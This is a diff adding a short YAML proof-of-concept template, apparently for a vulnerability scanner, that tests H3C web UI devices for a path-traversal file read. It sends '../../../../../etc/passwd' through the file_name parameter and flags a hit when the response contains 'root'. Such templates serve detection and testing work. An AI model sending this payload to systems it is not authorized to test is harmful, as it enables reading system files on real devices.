@@ -1,0 +1,13 @@
+name: poc-yaml-H3C-webui-file-read
+rules:
+  - method: GET
+    path: /webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down
+    follow_redirects: false
+    expression: |
+      response.body.bcontains(bytes("root"))
+detail:
+    info: |
+       漏洞链接：https://127.0.0.1/webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down
+    author: test
+    links:
+        - https://mp.weixin.qq.com/s/k-cHXIsvygpEM3P1gKbKZg
